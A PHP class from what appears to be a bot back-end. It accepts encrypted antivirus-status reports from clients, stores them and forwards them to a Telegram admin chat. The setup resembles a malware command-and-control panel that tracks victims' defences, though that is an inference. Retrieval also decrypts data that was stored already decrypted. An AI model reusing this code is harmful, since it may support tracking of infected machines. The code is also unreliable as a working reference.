<?php
class LoggerBot
{
    private function handleUploadAntivirusStatus($data)
    {
        try {
            $this->logWebhook("Antivirus Status Upload: " . json_encode($data));

            $clientId = $data['client_id'] ?? null;
            $antivirusData = $data['antivirus_data'] ?? null;

            if (!$clientId || !$antivirusData) {
                $this->logError("Antivirus status upload failed: Missing client_id or antivirus_data");
                http_response_code(400);
                return ['error' => 'Missing client_id or antivirus_data'];
            }

            $decryptedAntivirusData = $this->decrypt($antivirusData);
            if ($decryptedAntivirusData === '') {
                $this->logError("Antivirus data decryption failed for client_id: $clientId");
                http_response_code(400);
                return ['error' => 'Decryption failed'];
            }

            $antivirusJson = json_decode($decryptedAntivirusData, true);
            if (!$antivirusJson || json_last_error() !== JSON_ERROR_NONE) {
                $this->logError("Invalid antivirus data format for client_id: $clientId, decrypted: " . substr($decryptedAntivirusData, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid data format'];
            }

            // Store in client_logs
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
            VALUES (?, 'antivirus_status', ?, NOW())"
            );
            $stmt->execute([$clientId, $decryptedAntivirusData]);

            // Prepare Telegram message
            $message = "🛡️ Antivirus Status Received:\n";
            $message .= "Client ID: $clientId\n";
            $message .= "Antivirus: " . ($antivirusJson['name'] ?? 'Unknown') . "\n";
            $message .= "Status: " . ($antivirusJson['status'] ?? 'Unknown') . "\n";
            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);

            $this->logWebhook("Antivirus status processed for client_id: $clientId");
            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Antivirus status upload failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function getAntivirusStatusResult($clientId)
    {
        try {
            $stmt = $this->pdo->prepare(
                "SELECT message, created_at 
         FROM client_logs 
         WHERE client_id = ? AND log_type = 'antivirus_status' 
         ORDER BY created_at DESC LIMIT 1"
            );
            $stmt->execute([$clientId]);
            $log = $stmt->fetch(PDO::FETCH_ASSOC);

            if (!$log) {
                return "No antivirus status found for client $clientId";
            }

            $decryptedData = $this->decrypt($log['message']);
            if ($decryptedData === '') {
                $this->logError("Decryption failed for antivirus status, client_id: $clientId");
                return "Error: Decryption failed";
            }

            $antivirusJson = json_decode($decryptedData, true);
            if (!$antivirusJson || json_last_error() !== JSON_ERROR_NONE) {
                $this->logError("Invalid JSON format for antivirus status, client_id: $clientId");
                return "Error: Invalid data format";
            }

            $message = "🛡️ Antivirus Status for Client $clientId:\n";
            $message .= "Received at: " . $log['created_at'] . "\n";
            $message .= "Antivirus: " . ($antivirusJson['name'] ?? 'Unknown') . "\n";
            $message .= "Status: " . ($antivirusJson['status'] ?? 'Unknown') . "\n";

            return $message;
        } catch (Exception $e) {
            $this->logError("Failed to retrieve antivirus status for client_id: $clientId, error: " . $e->getMessage());
            return "Error retrieving antivirus status: " . $e->getMessage();
        }
    }
}
